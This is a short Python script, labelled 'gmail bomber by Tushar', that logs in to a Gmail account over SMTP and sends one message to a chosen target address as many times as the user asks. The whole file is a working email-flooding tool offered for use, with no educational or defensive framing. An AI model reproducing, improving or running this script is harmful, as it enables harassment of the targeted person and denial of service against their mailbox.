import smtplib

print("gmail bomber by Tushar \n")
target=input("Enter Target's Gmail Address ")
msg=input("Enter your Message: ")
number=int(input("Enter Number of time For Mail to be Sent: "))

print("\n(+)Login to our Gmail Account: \n")
email=input("(+)Enter your Gmail: ")
password=input("(+)Enter your Password: ")

srv=smtplib.SMTP("smtp.gmail.com",587)
srv.starttls()
srv.login(email,password)


for i in range(0,number):
                 srv.sendmail(email,target,msg)
                 print(f" |  (i)  Mail sent  |  ")

srv.quit()
                
